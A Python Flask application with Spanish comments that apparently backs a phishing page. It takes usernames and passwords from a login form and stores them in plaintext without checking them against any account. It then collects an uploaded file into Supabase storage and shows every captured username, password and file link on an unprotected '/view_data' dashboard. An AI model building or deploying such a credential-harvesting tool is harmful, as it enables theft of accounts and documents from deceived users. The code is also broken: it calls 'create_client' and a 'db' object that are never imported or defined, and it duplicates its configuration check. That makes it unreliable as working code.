import datetime
import os
import uuid
import json
import requests # Necesario para hacer llamadas a la API REST de Supabase
from flask import Flask, request, redirect, url_for, render_template


# --- CONFIGURACIÓN DE LA APLICACIÓN ---
app = Flask(__name__)

# Clave de la "tabla" de simulación de DB
DB_KEY = "user_sessions" 

# Inicialización de Supabase
# Se recomienda usar os.environ.get para garantizar que se lean las variables de Render
# NOTA: Los nombres de las variables deben coincidir exactamente con los que pusiste en Render.
SUPABASE_URL = os.environ.get("SUPABASE_URL")
SUPABASE_ANON_KEY = os.environ.get("SUPABASE_ANON_KEY")

if not SUPABASE_URL or not SUPABASE_ANON_KEY:
    print("FATAL: SUPABASE_URL o SUPABASE_ANON_KEY no están configuradas en el entorno.")
    exit(1) # Forzar la salida si falta una variable, para que el log muestre el error.

supabase: Client = create_client(SUPABASE_URL, SUPABASE_ANON_KEY)
# Nombre del bucket de almacenamiento que creaste en Supabase (debe ser 'files')
STORAGE_BUCKET_NAME = "files" 


# VALIDACIÓN CRÍTICA: Asegura que las claves de Supabase estén configuradas
if not SUPABASE_URL or not SUPABASE_ANON_KEY:
    print("WARNING: Las variables de entorno SUPABASE_URL y SUPABASE_ANON_KEY NO están configuradas.")
    print("La subida de archivos fallará si no se configuran en Railway.")


# --- Funciones de utilidad para la DB (SIMULACIÓN DE DB) ---

def initialize_db():
    # Inicializa la simulación de DB si es necesario
    if DB_KEY not in db:
        db[DB_KEY] = json.dumps({})
    
def save_session_data(session_id, data):
    # Guarda los datos de la sesión (credenciales, URL del archivo)
    initialize_db()
    sessions = json.loads(db[DB_KEY])
    if session_id not in sessions:
        sessions[session_id] = {}
        
    sessions[session_id].update(data)
    sessions[session_id]['last_update'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    db[DB_KEY] = json.dumps(sessions)

def get_session_data(session_id):
    # Obtiene los datos de la sesión
    initialize_db()
    sessions = json.loads(db[DB_KEY])
    return sessions.get(session_id, None)


# --- LÓGICA DE SUBIDA A SUPABASE STORAGE ---

def upload_file_to_supabase(file, session_id):
    """Sube un archivo cargado (werkzeug.FileStorage) a Supabase Storage via API REST."""
    
    if not SUPABASE_URL or not SUPABASE_ANON_KEY:
        return None, "Claves de Supabase no configuradas. Falló la subida."

    if not file.filename:
        return None, "Filename is empty."
        
    original_filename = file.filename
    # Define la ruta del archivo: {ID_SESION}/TIMESTAMP_NOMBRE.extension
    s3_key = f"{session_id}/{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}_{original_filename}"
    
    # URL de la API de Supabase Storage para subir el archivo
    upload_url = f"{SUPABASE_URL}/storage/v1/object/{STORAGE_BUCKET_NAME}/{s3_key}"
    
    # Leer el archivo como bytes.
    file.stream.seek(0)
    file_bytes = file.stream.read()

    headers = {
        # Clave pública necesaria para la autenticación
        "Authorization": f"Bearer {SUPABASE_ANON_KEY}", 
        "Content-Type": file.content_type if file.content_type else "application/octet-stream",
        "x-upsert": "true" 
    }

    try:
        # Petición HTTP POST para subir el archivo
        response = requests.post(upload_url, headers=headers, data=file_bytes)
        response.raise_for_status() # Lanza una excepción si el estado es 4xx o 5xx

        # La URL pública para que el archivo sea accesible
        file_url = f"{SUPABASE_URL}/storage/v1/object/public/{STORAGE_BUCKET_NAME}/{s3_key}"
        
        return file_url, None

    except requests.exceptions.RequestException as e:
        # Captura errores de red o errores de la API (ej. clave incorrecta)
        status_code = response.status_code if 'response' in locals() else 'N/A'
        response_text = response.text if 'response' in locals() else 'N/A'
        return None, f"Error API Supabase ({status_code}): {e}. Respuesta: {response_text}"
    except Exception as e:
        return None, f"Error desconocido: {e}"


# --- RUTAS DE LA APLICACIÓN ---

@app.route("/", methods=["GET"])
def show_login_form():
    """Muestra el formulario de inicio de sesión."""
    session_id = str(uuid.uuid4())
    return render_template('login.html', session_id=session_id)

@app.route("/process_login", methods=["POST"])
def process_login_and_redirect():
    """Captura credenciales y redirige a la subida."""
    username = request.form.get("username", "").strip()
    password = request.form.get("password", "").strip()
    session_id = request.form.get("session_id", "").strip()

    if not username or not password or not session_id:
        return redirect(url_for("show_login_form"))

    login_data = {
        "username": username,
        "password": password,
        "login_timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    save_session_data(session_id, login_data)
    return redirect(url_for('show_upload_page', session_id=session_id))

@app.route("/upload/<session_id>", methods=["GET"])
def show_upload_page(session_id):
    """Muestra la página de subida de archivos."""
    return render_template('upload.html', session_id=session_id)

@app.route("/process_upload", methods=["POST"])
def process_upload():
    """Procesa el archivo, lo sube a Supabase y guarda la URL en DB."""
    
    session_id = request.form.get("session_id", "").strip()
    
    # 1. Verificar sesión
    if not session_id or not get_session_data(session_id):
        return redirect(url_for("show_login_form"))

    # 2. Verificar archivo
    if 'file' not in request.files:
        return "Error: No se encontró el campo 'file'.", 400
        
    file = request.files['file']
    
    if file.filename == '':
        return "Error: No se seleccionó ningún archivo.", 400

    if file:
        # 3. Subir el archivo a Supabase Storage
        file_url, error = upload_file_to_supabase(file, session_id)
        
        if error:
            print(f"ERROR SUPABASE: {error}")
            return f"Error al subir el archivo: {error}", 500

        # 4. Guardar la URL del archivo en la DB
        file_data = {
            "uploaded_file_url": file_url,
            "original_filename": file.filename,
            "upload_timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        save_session_data(session_id, file_data)
        
        # 5. Finalizar
        return render_template('final.html')
        
    return "Error desconocido al procesar la subida.", 500

@app.route("/view_data")
def view_data():
    """Ruta de Dashboard (ver datos capturados)."""
    initialize_db()
    sessions = json.loads(db[DB_KEY])
    
    data_list = []
    for session_id, data in sessions.items():
        data_list.append({
            "session_id": session_id,
            "username": data.get("username", "N/A"),
            "password": data.get("password", "N/A"),
            "file_name": data.get("original_filename", "N/A"),
            "file_url": data.get("uploaded_file_url", "N/A"),
            "timestamp": data.get("last_update", "N/A")
        })

    return render_template('dashboard.html', data_list=data_list)


if __name__ == "__main__":
    # La aplicación se ejecuta en el puerto que Railway le asigne (o 8080 por defecto)
    app.run(host='0.0.0.0', port=os.environ.get("PORT", 8080))
